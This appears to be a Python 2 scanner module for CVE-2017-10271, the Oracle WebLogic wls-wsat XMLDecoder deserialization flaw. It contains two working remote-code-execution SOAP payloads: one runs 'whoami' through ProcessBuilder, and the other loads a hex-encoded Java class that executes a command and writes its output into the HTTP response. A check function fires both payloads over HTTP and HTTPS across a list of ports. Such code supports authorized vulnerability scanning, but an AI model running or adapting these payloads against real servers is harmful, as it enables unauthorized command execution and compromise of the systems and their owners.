#coding:utf-8
#!/usr/bin/env 
#CVE_2017_10271(wls-wsat)

import socket
import ssl
import default_data.dict_ports


payload1 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
     <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
     <java version="1.8.0_131" class="java.beans.XMLDecoder">
     <void class="java.lang.ProcessBuilder">
     <array class="java.lang.String" length="3">
     <void index="0">
     <string>/bin/bash</string>
     </void>
     <void index="1">
     <string>-c</string>
     </void>
     <void index="2">
     <string>whoami</string>
     </void>
     </array>
     <void method="start"/></void>
     </java>
     </work:WorkContext>
     </soapenv:Header>
     <soapenv:Body/>
    </soapenv:Envelope>'''

payload2 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>
                </void>
                <void class="org.mozilla.classfile.DefiningClassLoader">
                    <void method="defineClass">
                        <string>com.supeream.exploits.XmlExp</string>
                        <object idref="cls"></object>
                        <void method="newInstance">
                            <void method="say" id="proc">
                                <string>echo cve-2017-10271</string>
                            </void>
                        </void>
                    </void>
                </void>
                <void class="java.lang.Thread" method="currentThread">
                    <void method="getCurrentWork">
                        <void method="getResponse">
                            <void method="getServletOutputStream">
                                <void method="writeStream">
                                    <object idref="proc"></object>
                                </void>
                                <void method="flush"/>
                            </void>
                            <void method="getWriter"><void method="write"><string></string></void></void>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''
socket.setdefaulttimeout(1) 

def check(ip):
    content_length1 = len(payload1)
    content_length2 = len(payload2)
    for port in default_data.dict_ports.ports:
        try:
            client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
            client1.connect((ip,int(port)))
            client1.sendall('''POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length1,payload1))
            buf1 = ""                                                    # 重要 ！！！ 接收分块传输数据包
            buf = "1"
            while len(buf):
                try:
                    #print buf
                    buf1 = buf1 + buf
                    buf = client1.recv(1024)
                except socket.error as e:
                    break
            #print buf1                                                  #将接收到的分块传输包，汇总到buf1，输出（此处调试使用）
            client1.close()
            if "<faultstring>java.lang.ProcessBuilder" in buf1:
                return ip,port
        except socket.error as e:
            pass

        try:
            client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
            client1.connect((ip,int(port)))
            client1.sendall('''POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length2,payload2))
            buf1 = ""                                                    # 重要 ！！！ 接收分块传输数据包
            buf = "1"
            while len(buf):
                try:
                    #print buf
                    buf1 = buf1 + buf
                    buf = client1.recv(1024)
                except socket.error as e:
                    break
            #print buf1                                                  #将接收到的分块传输包，汇总到buf1，输出（此处调试使用）
            client1.close()
            if "cve-2017-10271" in buf1:
                return ip,port   
        except socket.error as e:
            pass
        
        try:
            client2 = ssl.wrap_socket(socket.socket())                   #基于https
            client2.connect((ip,int(port)))
            client2.sendall('''POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length1,payload1))
            buf1 = ""
            buf = "1"
            while len(buf):
                try:
                    buf1 = buf1 + buf
                    buf = client2.recv(1024)
                except socket.error as e:
                    break 
            client2.close()
            if "<faultstring>java.lang.ProcessBuilder" in buf1:
                return ip,port
        except socket.error as e:
            pass

        try:
            client2 = ssl.wrap_socket(socket.socket())                   #基于https
            client2.connect((ip,int(port)))
            client2.sendall('''POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length2,payload2))
            buf1 = ""
            buf = "1"
            while len(buf):
                try:
                    buf1 = buf1 + buf
                    buf = client2.recv(1024)
                except socket.error as e:
                    break
            client2.close()  
            if "cve-2017-10271" in buf1:
                return ip,port
        except socket.error as e:
            pass
       
if __name__=='__main__':
    print check('192.168.211.131')

